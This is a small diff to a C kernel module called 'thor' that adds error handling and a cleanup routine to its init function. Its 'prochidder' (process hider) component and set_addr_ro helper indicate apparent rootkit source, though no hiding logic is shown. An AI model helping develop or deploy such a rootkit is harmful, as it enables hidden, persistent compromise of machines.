@@ -22,6 +22,7 @@
 static int __init thor_init(void);
 static int __init procfile_init(void);
 static int __init prochidder_init(void);
+static void __exit thor_cleanup(void);
 static int procfile_open(struct inode *inode, struct file *file);
 static int procfile_read(struct seq_file *m, void *v);
 static ssize_t procfile_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos);
@@ -69,8 +70,12 @@ static void set_addr_ro(void *addr)
 // ------------------------------------------------------------ INIT
 static int __init thor_init(void)
 {
-    procfile_init();
-    prochidder_init();
+    if(procfile_init() < 0 || prochidder_init() < 0)
+    {
+        LOG_ERROR("failed to initialize");
+        thor_cleanup();
+        return -1;
+    }
 
     LOG_INFO("init done");
     return 0;
